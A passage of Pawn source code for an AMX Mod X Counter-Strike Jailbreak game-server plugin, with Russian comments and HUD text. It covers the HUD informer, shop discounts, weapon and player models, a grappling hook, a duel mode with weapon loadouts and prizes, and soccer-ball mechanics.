	{
		set_hudmessage(255, 165, 0, 0.3, 0.04, 0, 0.0, 0.8, 0.2, 0.2, -1);
	    ShowSyncHudMsg(pPlayer, g_iSyncMainInformer, "| Дуэль / %L %s^n| %L^n| %L^n| %L", 
	    pPlayer, g_szDaysWeek[g_iDayWeek], g_szDayModeTimer, 
	    pPlayer, "JBE_HUD_CHIEF", pPlayer, g_szChiefStatus[g_iChiefStatus], g_szChiefName, 
	    pPlayer, "JBE_HUD_PRISONERS", g_iAlivePlayersNum[1], g_iPlayersNum[1],
	    pPlayer, "JBE_HUD_GUARD", g_iAlivePlayersNum[2], g_iPlayersNum[2]);
	}
	else if(g_iDayMode == 2)
	{
	    set_hudmessage(255, 165, 0, 0.3, 0.04, 0, 0.0, 0.8, 0.2, 0.2, -1);
	    ShowSyncHudMsg(pPlayer, g_iSyncMainInformer, "| %L / %L %s^n| %L^n| %L^n| %L^n^n%s%s",  
	    pPlayer, g_szDaysWeek[g_iDayWeek], pPlayer, "JBE_HUD_GAME_MODE", pPlayer, g_szDayMode, g_szDayModeTimer, 
	    pPlayer, "JBE_HUD_CHIEF", pPlayer, g_szChiefStatus[g_iChiefStatus], g_szChiefName, 
	    pPlayer, "JBE_HUD_PRISONERS", g_iAlivePlayersNum[1], g_iPlayersNum[1],
	    pPlayer, "JBE_HUD_GUARD", g_iAlivePlayersNum[2], g_iPlayersNum[2], szTextFD, szTextWanted);
	}
	else if(g_MafiaGame)
	{
		set_hudmessage(255, 165, 0, 0.3, 0.04, 0, 0.0, 0.8, 0.2, 0.2, -1);
	    ShowSyncHudMsg(pPlayer, g_iSyncMainInformer, "| Мафия / %L %s^n| %L^n| %L^n| %L", 
	    pPlayer, g_szDaysWeek[g_iDayWeek], g_szDayModeTimer, 
	    pPlayer, "JBE_HUD_CHIEF", pPlayer, g_szChiefStatus[g_iChiefStatus], g_szChiefName, 
	    pPlayer, "JBE_HUD_PRISONERS", g_iAlivePlayersNum[1], g_iPlayersNum[1],
	    pPlayer, "JBE_HUD_GUARD", g_iAlivePlayersNum[2], g_iPlayersNum[2]);
	}
	else
	{
	    set_hudmessage(255, 165, 0, 0.3, 0.04, 0, 0.0, 0.8, 0.2, 0.2, -1);
	    ShowSyncHudMsg(pPlayer, g_iSyncMainInformer, "| %L / %L %s^n| %L^n| %L^n| Бунт: %d / Фд: %d^n| %L^n^n%s%s", 
	    pPlayer, g_szDaysWeek[g_iDayWeek], pPlayer, "JBE_HUD_GAME_MODE", pPlayer, g_szDayMode, g_szDayModeTimer, 
	    pPlayer, "JBE_HUD_CHIEF", pPlayer, g_szChiefStatus[g_iChiefStatus], g_szChiefName, 
	    pPlayer, "JBE_HUD_PRISONERS", g_iAlivePlayersNum[1], g_iPlayersNum[1], g_iWantedCount, g_iFreeCount,
	    pPlayer, "JBE_HUD_GUARD", g_iAlivePlayersNum[2], g_iPlayersNum[2], szTextFD, szTextWanted);
	}
}

jbe_set_user_discount(pPlayer)
{
	new iHour; time(iHour);
	if(iHour >= 23 || iHour <= 8) g_iUserDiscount[pPlayer] = 20;
	else g_iUserDiscount[pPlayer] = 0;
	if(IsSetBit(g_iBitUserVip, pPlayer)) g_iUserDiscount[pPlayer] += g_iAllCvars[VIP_DISCOUNT_SHOP];
}

jbe_get_price_discount(pPlayer, iCost)
{
	if(!g_iUserDiscount[pPlayer]) return iCost;
	iCost -= floatround(iCost / 100.0 * g_iUserDiscount[pPlayer]);
	return iCost;
}

public jbe_remove_invisible_hat(pPlayer)
{
	pPlayer -= TASK_INVISIBLE_HAT;
	if(IsNotSetBit(g_iBitInvisibleHat, pPlayer)) return;
	UTIL_SayText(pPlayer, "%L %L", LANG_PLAYER, "JBE_PREFIX", pPlayer, "JBE_MENU_ID_INVISIBLE_HAT_REMOVE");
	if(g_eUserRendering[pPlayer][RENDER_STATUS]) jbe_set_user_rendering(pPlayer, g_eUserRendering[pPlayer][RENDER_FX], g_eUserRendering[pPlayer][RENDER_RED], g_eUserRendering[pPlayer][RENDER_GREEN], g_eUserRendering[pPlayer][RENDER_BLUE], g_eUserRendering[pPlayer][RENDER_MODE], g_eUserRendering[pPlayer][RENDER_AMT]);
	else jbe_set_user_rendering(pPlayer, kRenderFxNone, 0, 0, 0, kRenderNormal, 0);
	if(g_eUserCostumes[pPlayer][HIDE]) jbe_set_user_costumes(pPlayer, g_eUserCostumes[pPlayer][COSTUMES]);
}

public jbe_user_defrost(pPlayer)
{
	pPlayer -= TASK_FROSTNADE_DEFROST;
	if(IsNotSetBit(g_iBitUserFrozen, pPlayer)) return;
	ClearBit(g_iBitUserFrozen, pPlayer);
	set_pev(pPlayer, pev_flags, pev(pPlayer, pev_flags) & ~FL_FROZEN);
	set_pdata_float(pPlayer, m_flNextAttack, 0.0, linux_diff_player);
	if(g_eUserRendering[pPlayer][RENDER_STATUS]) jbe_set_user_rendering(pPlayer, g_eUserRendering[pPlayer][RENDER_FX], g_eUserRendering[pPlayer][RENDER_RED], g_eUserRendering[pPlayer][RENDER_GREEN], g_eUserRendering[pPlayer][RENDER_BLUE], g_eUserRendering[pPlayer][RENDER_MODE], g_eUserRendering[pPlayer][RENDER_AMT]);
	else jbe_set_user_rendering(pPlayer, kRenderFxNone, 0, 0, 0, kRenderNormal, 0);
	emit_sound(pPlayer, CHAN_AUTO, "jb_engine/shop/defrost_player.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	new Float:vecOrigin[3]; pev(pPlayer, pev_origin, vecOrigin);
	CREATE_BREAKMODEL(vecOrigin, _, _, 10, g_pModelGlass, 10, 25, 0x01);
}

jbe_default_player_model(pPlayer)
{
    #if defined SKINS_DATA
	switch(g_iUserTeam[pPlayer])
	{
		case 1:
		{
			if(IsSetBit(g_iBitUserCostumModel, pPlayer)) jbe_set_user_model(pPlayer, g_iPlayerSkin[pPlayer]);
			else jbe_set_user_model(pPlayer, g_szPlayerModel[PRISONER]);
			
			set_pev(pPlayer, pev_skin, g_iUserSkin[pPlayer]);
		}
		case 2: jbe_set_user_model(pPlayer, g_szPlayerModel[GUARD]);
	}
	#endif
}

jbe_default_knife_model(pPlayer)
{
	switch(g_iUserTeam[pPlayer])
	{
		case 1: jbe_set_hand_model(pPlayer);
		case 2: jbe_set_baton_model(pPlayer);
	}
}

jbe_set_hand_model(pPlayer)
{
	static iszViewModel, iszWeaponModel;
	if(iszViewModel || (iszViewModel = engfunc(EngFunc_AllocString, g_szPlayerHand[PRISONER_V]))) set_pev_string(pPlayer, pev_viewmodel2, iszViewModel);
	if(iszWeaponModel || (iszWeaponModel = engfunc(EngFunc_AllocString, g_szPlayerHand[PRISONER_P]))) set_pev_string(pPlayer, pev_weaponmodel2, iszWeaponModel);
	set_pdata_float(pPlayer, m_flNextAttack, 0.75);
}

jbe_set_shocker_model(pPlayer)
{
    static iszViewModel, iszWeaponModel;
    if(iszViewModel || (iszViewModel = engfunc(EngFunc_AllocString, g_szPlayerHand[SHOCKER_V]))) set_pev_string(pPlayer, pev_viewmodel2, iszViewModel);
    if(iszWeaponModel || (iszWeaponModel = engfunc(EngFunc_AllocString, g_szPlayerHand[SHOCKER_P]))) set_pev_string(pPlayer, pev_weaponmodel2, iszWeaponModel);
    set_pdata_float(pPlayer, m_flNextAttack, 1.4);
}

jbe_set_baton_model(pPlayer)
{
	static iszViewModel, iszWeaponModel;
	if(iszViewModel || (iszViewModel = engfunc(EngFunc_AllocString, g_szPlayerHand[GUARD_V]))) set_pev_string(pPlayer, pev_viewmodel2, iszViewModel);
	if(iszWeaponModel || (iszWeaponModel = engfunc(EngFunc_AllocString, g_szPlayerHand[GUARD_P]))) set_pev_string(pPlayer, pev_weaponmodel2, iszWeaponModel);
	set_pdata_float(pPlayer, m_flNextAttack, 0.75);
}

jbe_set_sharpening_model(pPlayer)
{
	static iszViewModel, iszWeaponModel;
	if(iszViewModel || (iszViewModel = engfunc(EngFunc_AllocString, g_szModels[V_SHARPENING]))) set_pev_string(pPlayer, pev_viewmodel2, iszViewModel);
	if(iszWeaponModel || (iszWeaponModel = engfunc(EngFunc_AllocString, g_szModels[P_SHARPENING]))) set_pev_string(pPlayer, pev_weaponmodel2, iszWeaponModel);
	set_pdata_float(pPlayer, m_flNextAttack, 0.9);
}

jbe_set_screwdriver_model(pPlayer)
{
	static iszViewModel, iszWeaponModel;
	if(iszViewModel || (iszViewModel = engfunc(EngFunc_AllocString, g_szModels[V_SCREWDRIVER]))) set_pev_string(pPlayer, pev_viewmodel2, iszViewModel);
	if(iszWeaponModel || (iszWeaponModel = engfunc(EngFunc_AllocString, g_szModels[P_SCREWDRIVER]))) set_pev_string(pPlayer, pev_weaponmodel2, iszWeaponModel);
	set_pdata_float(pPlayer, m_flNextAttack, 0.9);
}

jbe_set_balisong_model(pPlayer)
{
	static iszViewModel, iszWeaponModel;
	if(iszViewModel || (iszViewModel = engfunc(EngFunc_AllocString, g_szModels[V_BALISONG]))) set_pev_string(pPlayer, pev_viewmodel2, iszViewModel);
	if(iszWeaponModel || (iszWeaponModel = engfunc(EngFunc_AllocString, g_szModels[P_BALISONG]))) set_pev_string(pPlayer, pev_weaponmodel2, iszWeaponModel);
	set_pdata_float(pPlayer, m_flNextAttack, 0.95);
}

jbe_set_machete_model(pPlayer)
{
	static iszViewModel, iszWeaponModel;
	if(iszViewModel || (iszViewModel = engfunc(EngFunc_AllocString, g_szModels[V_MACHETE]))) set_pev_string(pPlayer, pev_viewmodel2, iszViewModel);
	if(iszWeaponModel || (iszWeaponModel = engfunc(EngFunc_AllocString, g_szModels[P_MACHETE]))) set_pev_string(pPlayer, pev_weaponmodel2, iszWeaponModel);
	set_pdata_float(pPlayer, m_flNextAttack, 0.95);
}

jbe_set_serp_model(pPlayer)
{
	static iszViewModel, iszWeaponModel;
	if(iszViewModel || (iszViewModel = engfunc(EngFunc_AllocString, g_szModels[V_SERP]))) set_pev_string(pPlayer, pev_viewmodel2, iszViewModel);
	if(iszWeaponModel || (iszWeaponModel = engfunc(EngFunc_AllocString, g_szModels[P_SERP]))) set_pev_string(pPlayer, pev_weaponmodel2, iszWeaponModel);
	set_pdata_float(pPlayer, m_flNextAttack, 0.95);
}

public jbe_set_syringe_health(pPlayer)
{
	pPlayer -= TASK_REMOVE_SYRINGE;
	set_pev(pPlayer, pev_health, 200.0);
}

public jbe_remove_syringe_model(pPlayer)
{
	pPlayer -= TASK_REMOVE_SYRINGE;
	new iActiveItem = get_pdata_cbase(pPlayer, m_pActiveItem);
	if(iActiveItem > 0) ExecuteHamB(Ham_Item_Deploy, iActiveItem);
}

public jbe_hook_think(pPlayer)
{
	pPlayer -= TASK_HOOK_THINK;
	new Float:vecOrigin[3];
	pev(pPlayer, pev_origin, vecOrigin);
	new Float:vecVelocity[3];
	vecVelocity[0] = (g_vecHookOrigin[pPlayer][0] - vecOrigin[0]) * 3.0;
	vecVelocity[1] = (g_vecHookOrigin[pPlayer][1] - vecOrigin[1]) * 3.0;
	vecVelocity[2] = (g_vecHookOrigin[pPlayer][2] - vecOrigin[2]) * 3.0;
	new Float:flY = vecVelocity[0] * vecVelocity[0] + vecVelocity[1] * vecVelocity[1] + vecVelocity[2] * vecVelocity[2];
	new Float:flX = (5 * (str_to_float(g_szHookSpeed[g_iHookSpeed[pPlayer]][1]))) / floatsqroot(flY);
	vecVelocity[0] *= flX;
	vecVelocity[1] *= flX;
	vecVelocity[2] *= flX;
	set_pev(pPlayer, pev_velocity, vecVelocity);
	CREATE_BEAMENTPOINT(pPlayer, g_vecHookOrigin[pPlayer], g_iHookSpriteEff[g_iHookSprite[pPlayer]], 0, 1, 1, str_to_num(g_szHookSize[g_iHookSize[pPlayer]][1]), str_to_num(g_szHookType[g_iHookType[pPlayer]][1]), str_to_num(g_szHookColor[g_iHookColor[pPlayer]][1]), str_to_num(g_szHookColor[g_iHookColor[pPlayer]][2]), str_to_num(g_szHookColor[g_iHookColor[pPlayer]][3]), 200, _);
}

/*===== <- Остальной хлам <- =====*///}

/*===== -> Дуэль -> =====*///{
jbe_duel_start_ready(pPlayer, pTarget)
{
    remove_shields();
	g_iDuelStatus = 1;
	fm_strip_user_weapons(pPlayer, 1);
	fm_strip_user_weapons(pTarget, 1);
	g_iDuelUsersId[0] = pPlayer;
	g_iDuelUsersId[1] = pTarget;
	SetBit(g_iBitUserDuel, pPlayer);
	SetBit(g_iBitUserDuel, pTarget);
	ExecuteHamB(Ham_Player_ResetMaxSpeed, pPlayer);
	ExecuteHamB(Ham_Player_ResetMaxSpeed, pTarget);
	set_pev(pPlayer, pev_gravity, 1.0);
	set_pev(pTarget, pev_gravity, 1.0);
	if(get_user_godmode(pTarget)) set_user_godmode(pTarget, 0);
	get_user_name(pPlayer, g_iDuelNames[0], charsmax(g_iDuelNames[]));
	get_user_name(pTarget, g_iDuelNames[1], charsmax(g_iDuelNames[]));
	UTIL_SendAudio(0, _, g_szSounds[DUEL_START]);
	for(new i; i < charsmax(g_iHamHookForwards); i++) EnableHamForward(g_iHamHookForwards[i]);
	set_task(1.0, "jbe_duel_count_down", TASK_DUEL_COUNT_DOWN, _, _, "a", g_iDuelCountDown = 3 + 1);
	jbe_set_user_rendering(pPlayer, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 0);
	jbe_get_user_rendering(pPlayer, g_eUserRendering[pPlayer][RENDER_FX], g_eUserRendering[pPlayer][RENDER_RED], g_eUserRendering[pPlayer][RENDER_GREEN], g_eUserRendering[pPlayer][RENDER_BLUE], g_eUserRendering[pPlayer][RENDER_MODE], g_eUserRendering[pPlayer][RENDER_AMT]);
	g_eUserRendering[pPlayer][RENDER_STATUS] = true;
	jbe_set_user_rendering(pTarget, kRenderFxGlowShell, 0, 0, 255, kRenderNormal, 0);
	jbe_get_user_rendering(pTarget, g_eUserRendering[pTarget][RENDER_FX], g_eUserRendering[pTarget][RENDER_RED], g_eUserRendering[pTarget][RENDER_GREEN], g_eUserRendering[pTarget][RENDER_BLUE], g_eUserRendering[pTarget][RENDER_MODE], g_eUserRendering[pTarget][RENDER_AMT]);
	g_eUserRendering[pTarget][RENDER_STATUS] = true;
	CREATE_PLAYERATTACHMENT(pPlayer, _, g_pSpriteDuelRed, 3000);
	CREATE_PLAYERATTACHMENT(pTarget, _, g_pSpriteDuelBlue, 3000);
	set_task(0.1, "jbe_duel_line", TASK_DUEL_LINE, _, _, "b");
	set_task(1.0, "jbe_duel_timer", TASK_LAST_DIE, _, _, "a", g_iLastDieCountDown = 90 + 1);
	jbe_set_user_model(pPlayer, g_szPlayerModel[CHIEF]);
	jbe_set_user_model(pTarget, g_szPlayerModel[CHIEF]);
}

public jbe_duel_timer()
{
	if(--g_iLastDieCountDown)
	{
		jbe_duel_ended(0);
		return;
	}
	formatex(g_szDayModeTimer, charsmax(g_szDayModeTimer), "- %d", g_iLastDieCountDown);
}

public jbe_duel_line()
{
	static Float:vecOrigin[3];
	pev(g_iDuelUsersId[1], pev_origin, vecOrigin);
	CREATE_BEAMENTPOINT(g_iDuelUsersId[0], vecOrigin, g_pSpriteBeam, 0, 1, 1, 5, 1, 255, 0, 0, 255, _);
}

public jbe_duel_count_down()
{
	if(--g_iDuelCountDown)
	{
		new szBuffer[80];
		set_hudmessage(255, 165, 0, -1.0, 0.92, 0, 0.0, 0.9, 0.1, 0.1, -1);
		switch(g_iDuelPrize)
		{
			case -3: formatex(szBuffer, charsmax(szBuffer), "Приз: освобождение");
			case -1: formatex(szBuffer, charsmax(szBuffer), "Приз: $1500");
			default:
			{
				if(is_user_connected(g_iDuelPrize))
				{
					new szName[32]; get_user_name(g_iDuelPrize, szName, charsmax(szName));
					formatex(szBuffer, charsmax(szBuffer), "Приз: освобождение зеку %s", szName);
				}
				else formatex(szBuffer, charsmax(szBuffer), "Приз: освобождение себе");
			}
		}
		ShowSyncHudMsg(0, g_iSyncDuelInformer, "Оружие: %s^n%s^n%s VS %s^nДо начала %d сек.", g_iDuelWeaponName[g_iDuelType - 1], szBuffer, g_iDuelNames[0], g_iDuelNames[1], g_iDuelCountDown);
	}
	else jbe_duel_start();
}

jbe_duel_start()    // начало дуэли
{
    g_iDuelStatus = 2;
    switch(g_iDuelType)
    {
		case 1:
        {
            fm_give_item(g_iDuelUsersId[0], "weapon_knife");
            set_pev(g_iDuelUsersId[0], pev_health, 150.0);
            fm_give_item(g_iDuelUsersId[0], "item_assaultsuit");
            fm_give_item(g_iDuelUsersId[1], "weapon_knife");
            set_pev(g_iDuelUsersId[1], pev_health, 150.0);
            fm_give_item(g_iDuelUsersId[1], "item_assaultsuit");
        }
        case 2:
        {
            fm_give_item(g_iDuelUsersId[0], "weapon_deagle");
            fm_set_user_bpammo(g_iDuelUsersId[0], CSW_DEAGLE, 100);
            set_pev(g_iDuelUsersId[0], pev_health, 100.0);
            fm_give_item(g_iDuelUsersId[0], "item_assaultsuit");
            set_task(1.0, "jbe_duel_timer_attack", g_iDuelUsersId[0]+TASK_DUEL_TIMER_ATTACK, _, _, "a", g_iDuelTimerAttack = 11);
            fm_give_item(g_iDuelUsersId[1], "weapon_deagle");
            fm_set_user_bpammo(g_iDuelUsersId[1], CSW_DEAGLE, 100);
            set_pev(g_iDuelUsersId[1], pev_health, 100.0);
            fm_give_item(g_iDuelUsersId[1], "item_assaultsuit");
            set_pdata_float(g_iDuelUsersId[1], m_flNextAttack, 11.0, linux_diff_player);
        }
        case 3:
		{
			fm_give_item(g_iDuelUsersId[0], "weapon_m3");
			fm_set_user_bpammo(g_iDuelUsersId[0], CSW_M3, 100);
			set_pev(g_iDuelUsersId[0], pev_health, 100.0);
			fm_give_item(g_iDuelUsersId[0], "item_assaultsuit");
			set_task(1.0, "jbe_duel_timer_attack", g_iDuelUsersId[0]+TASK_DUEL_TIMER_ATTACK, _, _, "a", g_iDuelTimerAttack = 11);
			fm_give_item(g_iDuelUsersId[1], "weapon_m3");
			fm_set_user_bpammo(g_iDuelUsersId[1], CSW_M3, 100);
			set_pev(g_iDuelUsersId[1], pev_health, 100.0);
			fm_give_item(g_iDuelUsersId[1], "item_assaultsuit");
			set_pdata_float(g_iDuelUsersId[1], m_flNextAttack, 11.0, linux_diff_player);
		}
        case 4:
        {
            fm_give_item(g_iDuelUsersId[0], "weapon_scout");
            fm_set_user_bpammo(g_iDuelUsersId[0], CSW_SCOUT, 100);
            set_pev(g_iDuelUsersId[0], pev_health, 120.0);
            fm_give_item(g_iDuelUsersId[0], "item_assaultsuit");
            set_pdata_float(get_pdata_cbase(g_iDuelUsersId[0], m_pActiveItem), m_flNextSecondaryAttack, get_gametime() + 11.0, linux_diff_weapon);
            set_task(1.0, "jbe_duel_timer_attack", g_iDuelUsersId[0]+TASK_DUEL_TIMER_ATTACK, _, _, "a", g_iDuelTimerAttack = 11);
            fm_give_item(g_iDuelUsersId[1], "weapon_scout");
            fm_set_user_bpammo(g_iDuelUsersId[1], CSW_SCOUT, 100);
            set_pev(g_iDuelUsersId[1], pev_health, 120.0);
            fm_give_item(g_iDuelUsersId[1], "item_assaultsuit");
            set_pdata_float(g_iDuelUsersId[1], m_flNextAttack, 11.0, linux_diff_player);
        }
		case 5:
        {
            fm_give_item(g_iDuelUsersId[0], "weapon_ak47");
            fm_set_user_bpammo(g_iDuelUsersId[0], CSW_AK47, 350);
            set_pev(g_iDuelUsersId[0], pev_health, 350.0);
            fm_give_item(g_iDuelUsersId[0], "item_assaultsuit");
            fm_give_item(g_iDuelUsersId[1], "weapon_m4a1");
            fm_set_user_bpammo(g_iDuelUsersId[1], CSW_M4A1, 350);
            set_pev(g_iDuelUsersId[1], pev_health, 350.0);
            fm_give_item(g_iDuelUsersId[1], "item_assaultsuit");
        }
        case 6:
        {
            fm_give_item(g_iDuelUsersId[0], "weapon_awp");
            fm_set_user_bpammo(g_iDuelUsersId[0], CSW_AWP, 100);
            set_pev(g_iDuelUsersId[0], pev_health, 180.0);
            fm_give_item(g_iDuelUsersId[0], "item_assaultsuit");
            set_pdata_float(get_pdata_cbase(g_iDuelUsersId[0], m_pActiveItem), m_flNextSecondaryAttack, get_gametime() + 11.0, linux_diff_weapon);
            set_task(1.0, "jbe_duel_timer_attack", g_iDuelUsersId[0]+TASK_DUEL_TIMER_ATTACK, _, _, "a", g_iDuelTimerAttack = 11);
            fm_give_item(g_iDuelUsersId[1], "weapon_awp");
            fm_set_user_bpammo(g_iDuelUsersId[1], CSW_AWP, 100);
            set_pev(g_iDuelUsersId[1], pev_health, 180.0);
            fm_give_item(g_iDuelUsersId[1], "item_assaultsuit");
            set_pdata_float(g_iDuelUsersId[1], m_flNextAttack, 11.0, linux_diff_player);
        }
    }
    set_user_maxspeed(g_iDuelUsersId[0], 450.0);
    set_user_maxspeed(g_iDuelUsersId[1], 450.0);
}

public jbe_duel_timer_attack(pPlayer)
{
	pPlayer -= TASK_DUEL_TIMER_ATTACK;
	if(--g_iDuelTimerAttack)
	{
		set_hudmessage(255, 165, 0, -1.0, 0.92, 0, 0.0, 0.9, 0.1, 0.1, -1);
		ShowSyncHudMsg(0, g_iSyncDuelInformer, "Очередь %s^nДо автовыстрела %d сек.^nCT: %d HP | TT: %d HP", g_iDuelNames[pPlayer == g_iDuelUsersId[0] ? 0 : 1], g_iDuelTimerAttack, pev(g_iDuelUsersId[1], pev_health), pev(g_iDuelUsersId[0], pev_health));
	}
	else
	{
		new iActiveItem = get_pdata_cbase(pPlayer, m_pActiveItem, linux_diff_player);
		if(iActiveItem > 0) ExecuteHamB(Ham_Weapon_PrimaryAttack, iActiveItem);
	}
}

jbe_duel_ended(pPlayer)
{
	for(new i; i < charsmax(g_iHamHookForwards); i++) DisableHamForward(g_iHamHookForwards[i]);
	g_iBitUserDuel = 0;
	g_szDayModeTimer = "";
	remove_task(TASK_DUEL_LINE);
	remove_task(TASK_LAST_DIE);
	jbe_set_user_rendering(g_iDuelUsersId[0], kRenderFxNone, 0, 0, 0, kRenderNormal, 0);
	jbe_set_user_rendering(g_iDuelUsersId[1], kRenderFxNone, 0, 0, 0, kRenderNormal, 0);
	CREATE_KILLPLAYERATTACHMENTS(g_iDuelUsersId[0]);
	CREATE_KILLPLAYERATTACHMENTS(g_iDuelUsersId[1]);
	if(task_exists(g_iDuelUsersId[0]+TASK_DUEL_TIMER_ATTACK)) remove_task(g_iDuelUsersId[0]+TASK_DUEL_TIMER_ATTACK);
	if(task_exists(g_iDuelUsersId[1]+TASK_DUEL_TIMER_ATTACK)) remove_task(g_iDuelUsersId[1]+TASK_DUEL_TIMER_ATTACK);
	
	if(jbe_is_user_valid(pPlayer))
	{
		new iPlayer = g_iDuelUsersId[0] != pPlayer ? g_iDuelUsersId[0] : g_iDuelUsersId[1];
		ExecuteHamB(Ham_Player_ResetMaxSpeed, iPlayer);
		fm_strip_user_weapons(iPlayer);
		fm_give_item(iPlayer, "weapon_knife");
		switch(g_iDuelStatus)
		{
			case 1:
			{
				if(task_exists(TASK_DUEL_COUNT_DOWN))
				{
					remove_task(TASK_DUEL_COUNT_DOWN);
					client_cmd(0, "mp3 stop");
				}
			}
			case 2: 
			{
				switch(jbe_get_user_team(iPlayer))
				{
					case 1:
					{
						if(g_iDuelPrize == -1)
							jbe_set_user_money(iPlayer, g_iUserMoney[iPlayer] + 1500, 1);
						else
							SetBit(g_iBitUserFreeNextRound, is_user_connected(g_iDuelPrize) ? g_iDuelPrize : iPlayer);
					}
					case 2: jbe_set_user_money(iPlayer, g_iUserMoney[iPlayer] + 50, 1);
				}
			}	
		}
	}
	else if(IsSetBit(g_iBitUserAlive, g_iDuelUsersId[0]))
		ExecuteHamB(Ham_Killed, g_iDuelUsersId[0], g_iDuelUsersId[0], 0);
	
    g_iDuelType = 0;
    g_iDuelPrize = 0;
	g_iDuelStatus = 0;
	g_iDuelUsersId = { 0, 0 };
	
	for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(g_iUserTeam[i] != 1 || IsNotSetBit(g_iBitUserAlive, i)) continue;
        g_iLastPnId = i;
        set_task(1.0, "jbe_lastdie_count_down", TASK_LAST_DIE, _, _, "a", g_iLastDieCountDown = 20 + 1);
        Show_LastPrisonerMenu(i);
    }
}
/*===== -> Дуэль -> =====*///}

/*===== -> Футбол -> =====*///{
jbe_soccer_disable_all()
{
	jbe_soccer_remove_ball();
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(IsSetBit(g_iBitUserSoccer, iPlayer))
		{
			ClearBit(g_iBitUserSoccer, iPlayer);
			if(IsSetBit(g_iBitClothingGuard, iPlayer) && IsSetBit(g_iBitClothingType, iPlayer)) jbe_set_user_model(iPlayer, g_szPlayerModel[GUARD]);
			else jbe_default_player_model(iPlayer);
			set_pdata_int(iPlayer, m_bloodColor, 247);
			new iActiveItem = get_pdata_cbase(iPlayer, m_pActiveItem);
			if(iActiveItem > 0)
			{
				ExecuteHamB(Ham_Item_Deploy, iActiveItem);
				UTIL_WeaponAnimation(iPlayer, 3);
			}
			if(g_bSoccerGame) remove_task(iPlayer+TASK_SHOW_SOCCER_SCORE);
		}
	}
	if(g_bSoccerGame)
	{
		emit_sound(0, CHAN_STATIC, "jb_engine/soccer/crowd.wav", VOL_NORM, ATTN_NORM, SND_STOP, PITCH_NORM);
		if(g_iChiefStatus == 1) remove_task(g_iChiefId+TASK_SHOW_SOCCER_SCORE);
	}
	g_iSoccerScore = {0, 0};
	g_bSoccerGame = false;
	g_bSoccerStatus = false;
}

jbe_soccer_create_ball(pPlayer)
{
	if(g_iSoccerBall) return g_iSoccerBall;
	static iszFuncWall = 0;
	if(iszFuncWall || (iszFuncWall = engfunc(EngFunc_AllocString, "func_wall"))) g_iSoccerBall = engfunc(EngFunc_CreateNamedEntity, iszFuncWall);
	if(pev_valid(g_iSoccerBall))
	{
		set_pev(g_iSoccerBall, pev_classname, "ball");
		set_pev(g_iSoccerBall, pev_solid, SOLID_TRIGGER);
		set_pev(g_iSoccerBall, pev_movetype, MOVETYPE_BOUNCE);
		engfunc(EngFunc_SetModel, g_iSoccerBall, "models/jb_engine/soccer/ball.mdl");
		engfunc(EngFunc_SetSize, g_iSoccerBall, Float:{-4.0, -4.0, -4.0}, Float:{4.0, 4.0, 4.0});
		set_pev(g_iSoccerBall, pev_framerate, 1.0);
		set_pev(g_iSoccerBall, pev_sequence, 0);
		set_pev(g_iSoccerBall, pev_nextthink, get_gametime() + 0.04);
		fm_get_aiming_position(pPlayer, g_flSoccerBallOrigin);
		engfunc(EngFunc_SetOrigin, g_iSoccerBall, g_flSoccerBallOrigin);
		engfunc(EngFunc_DropToFloor, g_iSoccerBall);
		return g_iSoccerBall;
	}
	jbe_soccer_remove_ball();
	return 0;
}

jbe_soccer_remove_ball()
{
	if(g_iSoccerBall)
	{
		if(g_bSoccerBallTrail)
		{
			g_bSoccerBallTrail = false;
			CREATE_KILLBEAM(g_iSoccerBall);
		}
		if(g_iSoccerBallOwner)
		{
			CREATE_KILLPLAYERATTACHMENTS(g_iSoccerBallOwner);
			jbe_set_hand_model(g_iSoccerBallOwner);
		}
		if(pev_valid(g_iSoccerBall)) engfunc(EngFunc_RemoveEntity, g_iSoccerBall);
		g_iSoccerBall = 0;
		g_iSoccerBallOwner = 0;
		g_iSoccerKickOwner = 0;
		g_bSoccerBallTouch = false;
	}
}

jbe_soccer_update_ball()
{
	if(g_iSoccerBall)
	{
		if(pev_valid(g_iSoccerBall))
		{
			if(g_bSoccerBallTrail)
			{
				g_bSoccerBallTrail = false;
				CREATE_KILLBEAM(g_iSoccerBall);
			}
			if(g_iSoccerBallOwner)
			{
				CREATE_KILLPLAYERATTACHMENTS(g_iSoccerBallOwner);
				jbe_set_hand_model(g_iSoccerBallOwner);
			}
			set_pev(g_iSoccerBall, pev_velocity, {0.0, 0.0, 0.0});
			set_pev(g_iSoccerBall, pev_solid, SOLID_TRIGGER);
			engfunc(EngFunc_SetModel, g_iSoccerBall, "models/jb_engine/soccer/ball.mdl");
			engfunc(EngFunc_SetSize, g_iSoccerBall, Float:{-4.0, -4.0, -4.0}, Float:{4.0, 4.0, 4.0});
			engfunc(EngFunc_SetOrigin, g_iSoccerBall, g_flSoccerBallOrigin);
			engfunc(EngFunc_DropToFloor, g_iSoccerBall);
			g_iSoccerBallOwner = 0;
			g_iSoccerKickOwner = 0;
			g_bSoccerBallTouch = false;
		}
		else jbe_soccer_remove_ball();
	}
}

jbe_soccer_game_start(pPlayer)
{
	new iPlayers;
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++) if(IsSetBit(g_iBitUserSoccer, iPlayer)) iPlayers++;
	if(iPlayers < 2) UTIL_SayText(pPlayer, "%L %L", LANG_PLAYER, "JBE_PREFIX", pPlayer, "JBE_CHAT_ID_SOCCER_INSUFFICIENTLY_PLAYERS");
	else
	{
		for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++) if(IsSetBit(g_iBitUserSoccer, iPlayer) || iPlayer == g_iChiefId) set_task(1.0, "jbe_soccer_score_informer", iPlayer+TASK_SHOW_SOCCER_SCORE, _, _, "b");
		emit_sound(pPlayer, CHAN_AUTO, "jb_engine/soccer/whitle_start.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
		emit_sound(0, CHAN_STATIC, "jb_engine/soccer/crowd.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
		g_bSoccerBallTouch = true;
		g_bSoccerGame = true;
	}
}

jbe_soccer_game_end(pPlayer)
{
	jbe_soccer_remove_ball();
	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
	{
		if(IsSetBit(g_iBitUserSoccer, iPlayer))
		{
			ClearBit(g_iBitUserSoccer, iPlayer);
